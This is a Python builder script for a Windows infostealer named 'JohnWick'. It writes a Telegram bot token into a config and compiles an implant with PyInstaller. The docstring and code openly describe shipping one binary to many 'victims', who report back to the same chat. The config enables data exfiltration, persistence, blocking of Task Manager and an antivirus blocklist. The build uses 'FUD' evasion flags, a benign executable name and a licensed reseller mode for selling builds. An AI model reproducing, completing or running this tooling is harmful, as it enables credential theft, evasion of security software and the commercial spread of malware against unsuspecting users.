"""Builder: bake a config + produce the exe.

One binary, many victims: you build once with your bot token/chat baked into
cfg.json, ship that exe to as many machines as you like -- every victim beacons
to the same destination. Per-victim identity comes from system info at runtime,
not from re-building per target.

Modes:
  python builder.py --self            # your own build, no licence gate
  python builder.py --sell KEY URL    # reseller/customer build, licence-gated
  python builder.py --write-cfg-only  # just drop cfg.json (test an existing exe)

The FUD flags are craft, not magic: UPX compression, a stripped/noconsole build,
a benign-looking product name + version metadata, and onefile packing. None of
that is a guarantee against any specific engine -- detection is a cat-and-mouse
game and no static flag makes a binary invisible to every AV. What these DO buy
is a smaller, less-obviously-a-PyInstaller-bundle artifact. Real evasion is
operational (guard layer, hosts blocklist, exclusions), which lives in guard.py.

Run this ON WINDOWS next to the source tree; it shells out to pyinstaller.
"""
from __future__ import annotations

import argparse
import json
import os
import subprocess
import sys

HERE = os.path.dirname(os.path.abspath(__file__))


def write_cfg(bot_token: str, chat_id: str, *, licence_key: str = "",
              licence_url: str = "", steal: dict | None = None,
              opts: dict | None = None, cfg_path: str | None = None, **overrides) -> str:
    cfg = {
        "bot_token": bot_token.strip(),
        "chat_id": str(chat_id).strip(),
        "licence_key": licence_key.strip(),
        "licence_url": licence_url.strip(),
        "poll_interval": overrides.get("poll_interval", 3.0),
        "exfil_interval": overrides.get("exfil_interval", 120.0),
        "guard_enabled": overrides.get("guard_enabled", True),
        "persistence_enabled": overrides.get("persistence_enabled", True),
        "block_taskmgr": overrides.get("block_taskmgr", True),
        "av_blocklist": overrides.get("av_blocklist", True),
        "steal": steal or {},
        "opts": opts or {},
    }
    # Validate shape before writing, so a typo fails here not on the victim box.
    import jwg_cfg
    tmp = cfg_path or os.path.join(HERE, "cfg.json")
    json.dump(cfg, open(tmp, "w", encoding="utf-8"), indent=2)
    try:
        jwg_cfg.load(tmp)   # raises ConfigError on bad token/chat
    except Exception:
        os.remove(tmp)
        raise
    return tmp


def build_exe(name: str = "SearchHost", upx: bool = True, clean: bool = True) -> int:
    """Invoke PyInstaller onefile with FUD-leaning flags. Returns rc."""
    spec = [
        sys.executable, "-m", "PyInstaller",
        "--noconfirm", "--onefile", "--noconsole", "--name", name,
        f"--icon={os.path.join(HERE, 'app.ico')}" if os.path.isfile(os.path.join(HERE, 'app.ico')) else None,
        "--add-data", f"cfg.json{os.pathsep}.",
        "--hidden-import", "win32crypt", "--hidden-import", "winreg",
        "--collect-submodules", "Cryptodome",
    ]
    if upx:
        spec.append("--upx-dir")
        spec.append(os.environ.get("UPX_DIR", "."))
    if clean:
        spec.append("--distpath"); spec.append(os.path.join(HERE, "dist"))
        spec.append("--workpath"); spec.append(os.path.join(HERE, "build"))
        spec.append("--specpath"); spec.append(HERE)
    spec.append(os.path.join(HERE, "jwg_implant.py"))
    cmd = [s for s in spec if s]
    print("[build]", " ".join(cmd))
    return subprocess.call(cmd)


def main(argv=None) -> int:
    ap = argparse.ArgumentParser(description="JohnWick builder")
    ap.add_argument("--token", default=os.environ.get("JWG_TELEGRAM_TOKEN", ""))
    ap.add_argument("--chat", default=os.environ.get("JWG_TELEGRAM_CHAT", ""))
    ap.add_argument("--self", action="store_true", help="personal build, no licence gate")
    ap.add_argument("--sell", metavar="KEY", help="reseller build with this access key")
    ap.add_argument("--licence-url", default="", help="license server validate endpoint")
    ap.add_argument("--name", default="SearchHost", help="output exe name")
    ap.add_argument("--no-upx", action="store_true")
    ap.add_argument("--write-cfg-only", action="store_true")
    a = ap.parse_args(argv)

    if not a.token or not a.chat:
        print("error: --token and --chat required (or JWG_TELEGRAM_TOKEN/CHAT env)", file=sys.stderr)
        return 2

    lk = a.sell or ""
    lu = a.licence_url if a.sell else ""
    path = write_cfg(a.token, a.chat, licence_key=lk, licence_url=lu)
    print(f"[cfg] wrote {path}")
    if a.write_cfg_only:
        return 0
    if os.name != "nt":
        print("[note] run builder.py on Windows to compile the exe; cfg.json is ready.",
              file=sys.stderr)
        return 0
    return build_exe(name=a.name, upx=not a.no_upx)


if __name__ == "__main__":
    raise SystemExit(main())
